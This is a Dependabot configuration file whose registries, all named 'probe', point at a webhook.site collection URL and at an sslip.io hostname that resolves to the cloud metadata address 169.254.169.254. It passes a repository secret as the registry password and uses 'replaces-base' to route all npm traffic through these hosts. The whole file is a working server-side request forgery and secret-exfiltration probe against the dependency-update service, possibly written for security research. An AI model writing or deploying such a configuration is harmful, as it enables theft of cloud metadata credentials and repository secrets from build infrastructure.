version: 2
registries:
  probe-control:
    type: docker-registry
    url: https://79d2dd56-390e-46aa-a6b9-cb605d97980d.webhook.site
    username: probe
    password: ${{ secrets.PROBE_PASSWORD }}
  probe-imds:
    type: docker-registry
    url: http://169-254-169-254.sslip.io:80
    username: probe
    password: ${{ secrets.PROBE_PASSWORD }}
  probe-npm-control:
    type: npm-registry
    url: https://79d2dd56-390e-46aa-a6b9-cb605d97980d.webhook.site
    username: probe
    password: ${{ secrets.PROBE_PASSWORD }}
    replaces-base: true
  probe-npm-imds:
    type: npm-registry
    url: http://169-254-169-254.sslip.io:80
    username: probe
    password: ${{ secrets.PROBE_PASSWORD }}
    replaces-base: true
updates:
- package-ecosystem: docker
  directory: /
  schedule:
    interval: daily
  registries:
  - probe-control
  - probe-imds
  open-pull-requests-limit: 2
- package-ecosystem: docker
  directory: /dead
  schedule:
    interval: daily
    time: 00:18
    timezone: Etc/UTC
  registries:
  - probe-control
  - probe-imds
  open-pull-requests-limit: 2
- package-ecosystem: npm
  directory: /
  schedule:
    interval: daily
  registries:
  - probe-npm-imds
  open-pull-requests-limit: 2
